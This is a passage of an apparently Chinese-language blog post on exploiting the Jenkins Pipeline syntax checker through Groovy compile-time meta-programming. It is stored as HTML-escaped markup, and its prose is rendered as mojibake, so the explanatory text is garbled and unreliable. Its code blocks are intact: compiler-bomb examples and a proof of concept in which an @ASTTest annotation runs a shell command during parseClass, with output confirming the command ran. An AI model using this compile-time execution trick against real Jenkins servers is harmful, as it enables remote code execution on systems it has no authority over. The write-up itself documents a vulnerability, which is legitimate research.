    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™è£¡ä½¿ç”¨äº† &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(â€¦)&lt;/a&gt; å»å®Œæˆ Groovy èªæ³•çš„è§£æ! å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±æ–¼é€™åªæ˜¯ä¸€å€‹ AST çš„è§£æï¼Œåœ¨æ²’æœ‰åŸ·è¡Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; çš„æ–¹æ³•å‰ï¼Œä»»ä½•å±éšªçš„æ“ä½œæ˜¯ä¸æœƒè¢«åŸ·è¡Œçš„ï¼Œä¾‹å¦‚å˜—è©¦å»è§£æé€™æ®µ Groovy ä»£ç¢¼æœƒç™¼ç¾å…¶å¯¦ä»€éº¼äº‹éƒ½æ²’ç™¼ç”Ÿ :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾ç¨‹å¼é–‹ç™¼è€…çš„è§’åº¦ä¾†çœ‹ï¼ŒPipeline å¯ä»¥æ“ä½œ Jenkins é‚£ä¸€å®šå¾ˆå±éšªï¼Œå› æ­¤è¦ç”¨åš´æ ¼çš„æ¬Šé™ä¿è­·ä½! ä½†é€™åªæ˜¯ä¸€æ®µç°¡å–®çš„èªæ³•éŒ¯èª¤æª¢æŸ¥ï¼Œè€Œä¸”å‘¼å«åˆ°çš„åœ°æ–¹å¾ˆå¤šï¼Œé™åˆ¶å¤ªåš´æ ¼çš„æ¬Šé™åªæœƒè®“è‡ªå·±ç¶æ‰‹ç¶è…³çš„!&lt;/p&gt;

&lt;p&gt;ä¸Šé¢çš„è§€é»è½èµ·ä¾†å¾ˆåˆç†ï¼Œå°±åªæ˜¯ä¸€å€‹ AST çš„è§£æè€Œä¸”æ²’æœ‰ä»»ä½• &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; æ–¹æ³•æ‡‰è©²å¾ˆå®‰å…¨ï¼Œä½†æ°å·§é€™è£¡å°±æˆç‚ºäº†æˆ‘å€‘ç¬¬ä¸€å€‹å…¥å£é»! å…¶å¯¦ç¬¬ä¸€æ¬¡çœ‹åˆ°é€™æ®µä»£ç¢¼æ™‚ï¼Œä¹Ÿæƒ³ä¸å‡ºä»€éº¼åˆ©ç”¨æ–¹æ³•å°±å…ˆè·³éäº†ï¼Œç›´åˆ°è¦é–‹å§‹æ’°å¯«æŠ€è¡“æ–‡ç« é‡æ–°æº«ç¿’äº†ä¸€æ¬¡ï¼Œæˆ‘æƒ³èµ·äº†èªªä¸å®š Meta-Programming æœƒæœ‰æé ­!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ä»€éº¼æ˜¯-meta-programming&quot;&gt;ä»€éº¼æ˜¯ Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;é¦–å…ˆæˆ‘å€‘ä¾†è§£é‡‹ä¸€ä¸‹ä»€éº¼æ˜¯ Meta-Programming!&lt;/p&gt;

&lt;p&gt;Meta-Programming æ˜¯ä¸€ç¨®ç¨‹å¼è¨­è¨ˆçš„æ€ç¶­! Meta-Programming çš„ç²¾é«“åœ¨æ–¼æä¾›äº†ä¸€å€‹æŠ½è±¡å±¤æ¬¡çµ¦é–‹ç™¼è€…ç”¨å¦å¤–ä¸€ç¨®æ€ç¶­å»æ’°å¯«æ›´é«˜éˆæ´»åº¦åŠæ›´é«˜é–‹ç™¼æ•ˆç‡çš„ä»£ç¢¼ã€‚å…¶å¯¦ Meta-Programming ä¸¦æ²’æœ‰ä¸€å€‹å¾ˆåš´è¬¹çš„å®šç¾©ï¼Œä¾‹å¦‚ä½¿ç”¨ç¨‹å¼èªè¨€ç·¨è­¯æ‰€ç•™ä¸‹çš„ Metadata å»å‹•æ…‹çš„ç”¢ç”Ÿç¨‹å¼ç¢¼ï¼Œæˆ–æ˜¯æŠŠç¨‹å¼è‡ªèº«ç•¶æˆè³‡æ–™ï¼Œé€éç·¨è­¯å™¨(compiler)æˆ–æ˜¯ç›´è­¯å™¨(interpreter)å»æ’°å¯«ä»£ç¢¼éƒ½å¯ä»¥è¢«èªªæ˜¯ä¸€ç¨® Meta-Programming! è€Œå…¶ä¸­çš„å“²å­¸å…¶å¯¦éå¸¸å»£æ³›ç”šè‡³å·²ç¶“å¯ä»¥è¢«ç•¶æˆç¨‹å¼èªè¨€çš„ä¸€å€‹ç« ç¯€ä¾†ç¨ç«‹æ¢è¨!&lt;/p&gt;

&lt;p&gt;å¤§éƒ¨åˆ†çš„æ–‡ç« æˆ–æ˜¯æ›¸ç±åœ¨è§£é‡‹ Meta-Programming çš„æ™‚å€™é€šå¸¸æœƒé€™æ¨£è§£é‡‹:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç”¨ç¨‹å¼ç¢¼(code)ç”¢ç”Ÿç¨‹å¼ç¢¼(code)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¦‚æœé‚„æ˜¯å¾ˆé›£ç†è§£ï¼Œä½ å¯ä»¥æƒ³åƒç¨‹å¼èªè¨€ä¸­çš„ &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; å…¶å¯¦å°±æ˜¯ä¸€ç¨®å»£ç¾©ä¸Šçš„ Meta-Programming! é›–ç„¶ä¸ç”šç²¾ç¢ºï¼Œä½†ç”¨é€™å€‹æ¯”å–»å¯ä»¥å¿«é€Ÿçš„ç†è§£ Meta-Programming! å…¶å¯¦å°±æ˜¯ç”¨ç¨‹å¼ç¢¼(eval é€™å€‹å‡½æ•¸)å»ç”¢ç”Ÿç¨‹å¼ç¢¼(eval å‡ºä¾†çš„å‡½æ•¸)! åœ¨ç¨‹å¼é–‹ç™¼ä¸Šï¼ŒMeta-Programming ä¹Ÿæœ‰è‘—æ¥µå…¶å¤šçš„æ‡‰ç”¨ï¼Œä¾‹å¦‚:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C èªè¨€ä¸­çš„ Macro&lt;/li&gt;
  &lt;li&gt;C++ çš„ Template&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby æœ¬èº«å°±æ˜¯ä¸€é–€å°‡ Meta-Programming ç™¼æ®åˆ°æ¥µè‡´çš„èªè¨€ï¼Œç”šè‡³é‚„æœ‰å°ˆé–€çš„&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;æ›¸1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;æ›¸2&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Java çš„ Annotation è¨»è§£&lt;/li&gt;
  &lt;li&gt;å„ç¨® DSL(Domain Specific Language) æ‡‰ç”¨ï¼Œä¾‹å¦‚ &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; åŠ &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è€Œç•¶æˆ‘å€‘åœ¨è«‡è«– Meta-Programming æ™‚ï¼Œä¾ç…§ä½œç”¨çš„ç¯„åœæˆ‘å€‘å¤§è‡´åˆ†æˆ &lt;strong&gt;(1)ç·¨è­¯æ™‚æœŸ&lt;/strong&gt; åŠ &lt;strong&gt;(2)åŸ·è¡Œæ™‚æœŸ&lt;/strong&gt;é€™å…©ç¨® Meta-Programming! è€Œæˆ‘å€‘ä»Šå¤©çš„é‡é»ï¼Œå°±æ˜¯åœ¨ç·¨è­¯æ™‚æœŸçš„ Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. æˆ‘ä¹Ÿä¸æ˜¯ä¸€ä½ Programming Language å¤§å¸«ï¼Œå¦‚æœ‰ä¸ç²¾ç¢ºæˆ–è€…è¦ºå¾—æ•™å£å°æœ‹å‹çš„åœ°æ–¹å†è«‹å¤šå¤šåŒ…æ¶µ &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•åˆ©ç”¨&quot;&gt;å¦‚ä½•åˆ©ç”¨&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;å¾å‰é¢çš„æ®µè½ä¸­æˆ‘å€‘ç™¼ç¾ Jenkins ä½¿ç”¨ &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(â€¦)&lt;/a&gt; å»æª¢æŸ¥èªæ³•éŒ¯èª¤ï¼Œæˆ‘å€‘ä¹Ÿæƒ³èµ·äº† Meta-Programming å¯åœ¨ç·¨è­¯æ™‚æœŸå°ç¨‹å¼ç¢¼åšä¸€äº›å‹•æ…‹çš„æ“ä½œ! è¨­è¨ˆä¸€å€‹ç·¨è­¯å™¨(æˆ–è§£æå™¨)æ˜¯ä¸€ä»¶å¾ˆéº»ç…©çš„äº‹æƒ…ï¼Œè£¡é¢æœƒæœ‰å„ç¨®éª¯é«’çš„å¯¦ä½œæˆ–æ˜¯å¥‡æ€ªçš„åŠŸèƒ½ï¼Œæ‰€ä»¥ä¸€å€‹å¾ˆç›´è¦ºçš„æƒ³æ³•å°±æ˜¯ï¼Œæ˜¯å¦å¯ä»¥é€éç·¨è­¯å™¨ä¸€äº›å‰¯ä½œç”¨(Side Effect)å»å®Œæˆä¸€äº›äº‹æƒ…å‘¢?&lt;/p&gt;

&lt;p&gt;èˆ‰å¹¾å€‹æ·ºé¡¯æ˜“æ‡‚çš„ä¾‹å­ï¼Œå¦‚ C èªè¨€å·¨é›†æ“´å±•æ‰€é€ æˆçš„è³‡æºè€—ç›¡&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç·¨è­¯å™¨çš„è³‡æºè€—ç›¡(ç”¨ 18 bytes ç”¢ç”Ÿ 16G çš„åŸ·è¡Œæª”)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ–æ˜¯ç”¨ç·¨è­¯å™¨ä¾†å¹«ä½ ç®—è²»å¼æ•¸åˆ—&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¾çµ„åˆèªè¨€çš„çµæœå¯ä»¥çœ‹å‡ºé€™äº›å€¼åœ¨ç·¨è­¯æœŸé–“å°±è¢«è¨ˆç®—å¥½å¡«å……é€²å»ï¼Œè€Œä¸æ˜¯åŸ·è¡ŒæœŸé–“!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ›´å¤šçš„ä¾‹å­ä½ å¯ä»¥åƒè€ƒ StackOverflow ä¸Šçš„ &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; é€™ç¯‡æ–‡ç« !&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;é¦–æ¬¡å˜—è©¦&quot;&gt;é¦–æ¬¡å˜—è©¦&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;å›åˆ°æˆ‘å€‘çš„æ¼æ´åˆ©ç”¨ä¸Šï¼ŒPipeline æ˜¯åŸºæ–¼ Groovy ä¸Šçš„ä¸€å€‹ DSL å¯¦ä½œï¼Œè€Œ Groovy å‰›å¥½å°±æ˜¯ä¸€é–€å°æ–¼ Meta-Programming éå¸¸å‹å–„çš„èªè¨€! ç¿»é–±è‘— Grovvy å®˜æ–¹çš„ &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming æ‰‹å†Š&lt;/a&gt; é–‹å§‹å°‹æ‰¾å„ç¨®å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•! åœ¨ 2.1.9 ç« ã€Œæ¸¬è©¦å”åŠ©ã€é€™å€‹æ®µè½ç™¼ç¾äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; é€™å€‹è¨»è§£ï¼Œä»”ç´°è§€å¯Ÿå®ƒçš„æ•˜è¿°:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer â€œexploreâ€ the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ä»€éº¼! å¯ä»¥åœ¨ AST ä¸ŠåŸ·è¡Œä¸€å€‹ assertion? é€™ä¸å°±æ˜¯æˆ‘å€‘è¦çš„å—? è¶•ç·Šå…ˆåœ¨æœ¬åœ°å¯«å€‹ Proof-of-Concept å˜—è©¦æ˜¯å¦å¯è¡Œ:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¹¹ï¼Œå¯ä»¥æ¬¸! ä½†ä»£èªŒä¸¦ä¸æ˜¯æ†¨äººæƒ³çš„é‚£éº¼ç°¡å–®! å˜—è©¦åœ¨é ç«¯ Jenkins é‡ç¾æ™‚ï¼Œå‡ºç¾äº†:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;çœŸæ˜¯é»‘äººå•è™Ÿï¼Œæ£®77ï¼Œé€™åˆ°åº•æ˜¯ä¸‰å°å•¦!!!&lt;/p&gt;

&lt;p&gt;èªçœŸè¿½äº†ä¸€ä¸‹ root cause æ‰ç™¼ç¾æ˜¯ &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt; é€™å€‹æ’ä»¶åœ¨ä½œæ€ª! ç‚ºäº†æ–¹ä¾¿ä½¿ç”¨è€…å¯é‡è¤‡ä½¿ç”¨åœ¨ç·¨å¯« Pipeline å¸¸ç”¨åˆ°çš„åŠŸèƒ½ï¼ŒJenkins æä¾›äº†é€™å€‹æ’ä»¶å¯åœ¨ Pipeline ä¸­å¼•å…¥è‡ªå®šç¾©çš„å‡½å¼åº«! Jenkins æœƒåœ¨æ‰€æœ‰ Pipeline åŸ·è¡Œå‰å¼•å…¥é€™å€‹å‡½å¼åº«ï¼Œè€Œåœ¨ç·¨è­¯æ™‚æœŸçš„ classPath ä¸­ä¸¦æ²’æœ‰ç›¸å°æ‡‰çš„å‡½å¼åº«å› è€Œå°è‡´äº†é€™å€‹éŒ¯èª¤!&lt;/p&gt;

